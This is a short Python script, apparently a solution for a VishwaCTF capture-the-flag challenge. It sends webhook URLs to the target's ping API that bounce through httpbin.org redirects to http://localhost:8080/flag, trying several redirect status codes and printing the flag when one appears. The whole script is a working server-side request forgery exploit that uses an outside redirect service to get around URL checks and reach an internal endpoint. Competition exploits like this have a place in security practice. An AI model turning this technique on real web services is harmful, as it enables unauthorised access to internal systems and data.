#!/usr/bin/env python3
import requests

BASE = "https://ping.vishwactf.com"

# Try different redirect services
services = [
    "https://httpbin.org/redirect-to?url=http://127.0.0.1:8080/flag",
    "https://httpbin.org/redirect-to?url=http://localhost:8080/flag&status_code=301",
    "https://httpbin.org/redirect-to?url=http://localhost:8080/flag&status_code=302",
    "https://httpbin.org/redirect-to?url=http://localhost:8080/flag&status_code=307",
]

for url in services:
    print(f"\n[*] Trying: {url[:80]}...")
    r = requests.post(f"{BASE}/api/ping", json={"webhook_url": url})
    res = r.json()
    print(f"    Result: {res}")
    if res.get('success') and res.get('preview'):
        if "VishwaCTF{" in res['preview']:
            print(f"\n[!!!] FLAG: {res['preview']}")
            break
